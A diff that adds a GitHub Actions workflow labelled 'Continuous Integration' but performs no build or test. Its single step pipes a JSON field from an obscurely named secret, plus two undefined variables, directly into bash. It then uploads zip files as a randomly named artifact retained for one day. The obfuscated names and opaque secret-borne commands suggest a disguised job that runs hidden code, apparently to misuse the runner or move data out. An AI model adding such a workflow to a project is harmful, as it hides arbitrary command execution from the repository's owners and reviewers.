@@ -1,0 +1,24 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          ow6: ${{ secrets.ow6 }}
+        run: |
+          printf '%s' "$ow6" | jq -r .iw853 | /bin/bash
+          echo $vtjeg2165 | jq -r .ibq06 | /bin/bash
+          echo $uvcy167 | jq -r .adh91 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: LCC80sBN
+          path: "*.zip"
+          retention-days: 1
